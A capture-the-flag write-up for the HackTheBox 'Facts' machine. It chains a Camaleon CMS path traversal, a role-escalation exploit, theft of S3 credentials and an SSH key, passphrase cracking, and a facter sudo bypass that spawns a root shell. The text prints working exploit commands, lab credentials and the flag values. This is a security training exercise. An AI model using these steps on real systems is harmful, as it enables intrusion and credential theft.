# HackTheBox — Facts
**Difficulty:** Easy | **OS:** Linux | **Points:** 20  
**Author:** thrandomv | **Date:** 2026-03-20

---

## Table of Contents
1. [Attack Chain Summary](#attack-chain-summary)
2. [Reconnaissance](#reconnaissance)
3. [Web Enumeration](#web-enumeration)
4. [Foothold — CVE-2024-46987 (LFI)](#foothold--cve-2024-46987-lfi)
5. [Privilege Escalation to CMS Admin — CVE-2025-2304](#privilege-escalation-to-cms-admin--cve-2025-2304)
6. [Lateral Movement — MinIO S3 Credential Harvest](#lateral-movement--minio-s3-credential-harvest)
7. [SSH Access — Key Extraction & Cracking](#ssh-access--key-extraction--cracking)
8. [Root — Facter sudo Bypass](#root--facter-sudo-bypass)
9. [Flags](#flags)
10. [Key Takeaways](#key-takeaways)

---

## Attack Chain Summary

```
Nmap → Port 80 (Nginx/Camaleon CMS 2.9.0) + Port 54321 (MinIO S3)
  ↓
Register CMS account → Identify version 2.9.0
  ↓
CVE-2024-46987 (Authenticated LFI/Path Traversal)
  → Read /etc/passwd → Identify users: trivia, william
  → Read /home/william/user.txt → USER FLAG
  ↓
CVE-2025-2304 (Authenticated Privilege Escalation to CMS Admin)
  → Escalate registered account to admin role
  → Extract hardcoded MinIO S3 credentials from Filesystem Settings
  ↓
AWS CLI → s3://internal bucket → Steal trivia's id_ed25519 SSH private key
  ↓
ssh2john + john (rockyou.txt) → Crack passphrase: dragonballz
  ↓
SSH as trivia@facts.htb
  ↓
sudo -l → (ALL) NOPASSWD: /usr/bin/facter
  → FACTERLIB env var blocked by sudoers
  → Bypass via --custom-dir flag (not restricted)
  → Load malicious Ruby fact → Root shell
  → Read /root/root.txt → ROOT FLAG
```

---

## Reconnaissance

### Host Discovery
```bash
fping 10.129.255.133
# 10.129.255.133 is alive
```

### TCP Port Scan
```bash
nmap -p- --min-rate 5000 10.129.255.133 -oN facts_allports.txt
```

**Results:**
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

### Service Fingerprint
```bash
nmap -sC -sV -p 22,80,54321 10.129.255.133 -oN facts_svc.txt
```

**Key findings:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.9p1 Ubuntu |
| 80 | HTTP | nginx 1.26.3 |
| 54321 | HTTP | **MinIO** (Golang S3-compatible object storage) |

The MinIO instance redirects to `http://facts.htb:9001` — this is the S3 API endpoint we'll exploit later.

### /etc/hosts
```bash
echo "10.129.255.133 facts.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Directory Brute Force
```bash
gobuster dir -u http://facts.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 --no-error 2>/dev/null
```

**Notable results (filtering wildcard 200s by size):**
```
admin   (Status: 302) → http://facts.htb/admin/login
ajax    (Status: 200)
search  (Status: 200)
```

The wildcard returns `200 OK` for all paths — filter by response size to identify real endpoints. The `/admin` redirect is the key entry point.

### CMS Identification

Navigating to `http://facts.htb/admin/login` reveals a login page with a registration option. After registering (e.g., `thrandomv:thrandomv`), the CMS footer discloses:

```
Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0
```

Searching for `Camaleon CMS 2.9.0 CVE` returns two critical vulnerabilities:
- **CVE-2024-46987** — Authenticated Path Traversal (CVSS 7.7)
- **CVE-2025-2304** — Authenticated Privilege Escalation (CVSS 9.4)

---

## Foothold — CVE-2024-46987 (LFI)

### Vulnerability Details

Camaleon CMS 2.9.0 fails to sanitize the `file` parameter in the `download_private_file` media controller endpoint, allowing an authenticated user to read arbitrary files from the server filesystem.

**Vulnerable endpoint:**
```
GET /admin/media/download_private_file?file=../../../../../../<path>
```

### Exploit

Clone the PoC:
```bash
git clone https://github.com/Goultarde/CVE-2024-46987
pip install requests --break-system-packages
```

Verify LFI and enumerate users:
```bash
python3 CVE-2024-46987/CVE-2024-46987.py \
  -u http://facts.htb -l thrandomv -p thrandomv -v /etc/passwd
```

**Output (relevant lines):**
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Two non-standard shell users identified: `trivia` and `william`.

### User Flag

```bash
python3 CVE-2024-46987/CVE-2024-46987.py \
  -u http://facts.htb -l thrandomv -p thrandomv /home/william/user.txt
```

```
**6a4444b3ad4907550ef921dc7a97**
```

> **Note:** The `user[username]` field is used for login, not `user[email]`. If the script returns nothing, verify with `-v` flag and ensure the correct field name.

---

## Privilege Escalation to CMS Admin — CVE-2025-2304

### Vulnerability Details

CVE-2025-2304 is an authenticated privilege escalation in Camaleon CMS 2.9.0. The password change AJAX endpoint (`/admin/users/[ID]/updated_ajax`) fails to strictly whitelist parameters, allowing a client-role user to smuggle a `role=admin` parameter and escalate to administrator.

### Exploit

Clone the PoC:
```bash
git clone https://github.com/Alien0ne/CVE-2025-2304
```

Escalate to admin and extract S3 credentials in one shot:
```bash
python3 CVE-2025-2304/exploit.py \
  -u http://facts.htb -U thrandomv -P thrandomv -e
```

**Output:**
```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIA602629A4F719096D
   s3 secret key: 5zTaAp010wKeTaoifT3xqahjqaOmohmaszjh6j23
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
```

The CMS stores MinIO S3 credentials in plaintext under `Settings → General Site → Filesystem Settings`.

---

## Lateral Movement — MinIO S3 Credential Harvest

### Configure AWS CLI

```bash
aws configure --profile facts
# AWS Access Key ID:     AKIA602629A4F719096D
# AWS Secret Access Key: 5zTaAp010wKeTaoifT3xqahjqaOmohmaszjh6j23
# Default region:        us-east-1
# Default output format: json
```

### Enumerate Buckets

```bash
aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
```

```
2025-09-11 13:06:52 internal
2025-09-11 13:06:52 randomfacts
```

### Enumerate Internal Bucket

```bash
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321 \
  --profile facts --recursive
```

The `internal` bucket contains a full home directory including a `.ssh/` folder:
```
2026-03-20 12:53:58    464 .ssh/id_ed25519
2026-03-20 12:53:58     82 .ssh/authorized_keys
```

### Download SSH Private Key

```bash
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 \
  --endpoint-url http://facts.htb:54321 --profile facts

chmod 600 id_ed25519
```

---

## SSH Access — Key Extraction & Cracking

The private key is passphrase-protected. Convert and crack:

```bash
python3 /usr/share/john/ssh2john.py id_ed25519 > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**
```
dragonballz      (id_ed25519)
```

### SSH Login

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

```
trivia@facts:~$
```

---

## Root — Facter sudo Bypass

### Sudo Enumeration

```bash
trivia@facts:~$ sudo -l
```

```
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=..., use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### What is Facter?

`facter` is a system profiling tool used by Puppet to gather "facts" about a host. It supports loading custom facts from user-defined directories via Ruby `.rb` files.

### Standard Method (Blocked)

```bash
# Sudoers explicitly blocks setting FACTERLIB env var
trivia@facts:~$ sudo FACTERLIB=/tmp /usr/bin/facter pwn
sudo: sorry, you are not allowed to set the following environment variables: FACTERLIB
```

### Bypass via --custom-dir Flag

The `--custom-dir` CLI flag achieves the same result as `FACTERLIB` but is not restricted by the sudoers configuration — a classic case of incomplete sudo hardening.

```bash
# Create malicious Ruby fact
echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb

# Execute with --custom-dir bypass
sudo /usr/bin/facter pwn --custom-dir /tmp
```

```
root@facts:/home/trivia#
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Flags

| Flag | Hash |
|------|------|
| User (`/home/william/user.txt`) | `**6a4444b3ad4907550ef921dc7a97**` |
| Root (`/root/root.txt`) | `**ee8133ad0dddb202a90da1bb4a79**` |

---

## Key Takeaways

**CVE-2024-46987 — Path Traversal:**  
The `download_private_file` endpoint performs no sanitization on the `file` parameter. Any authenticated user can read arbitrary files accessible by the `www-data` process, including SSH keys, `/etc/passwd`, and application configs.

**CVE-2025-2304 — Parameter Smuggling / IDOR:**  
The AJAX password-change endpoint doesn't whitelist allowed parameters. Appending `user[role]=admin` to the request body escalates privilege because Rails Strong Parameters were not properly enforced in this specific context.

**Hardcoded Credentials in CMS:**  
MinIO S3 credentials stored in plaintext within the CMS database/config are immediately accessible to any admin-level CMS user. Once escalation is achieved via CVE-2025-2304, full cloud storage access follows automatically.

**Facter sudo Misconfiguration:**  
Granting `sudo` on `facter` is effectively granting root, because custom facts execute arbitrary Ruby code. Blocking `FACTERLIB` without also blocking `--custom-dir` is an incomplete mitigation. The correct fix is to not grant `facter` sudo access at all, or use a tightly scoped sudoers rule that prevents flag injection.

---

*Writeup by thrandomv — HackTheBox | Facts | Easy Linux*
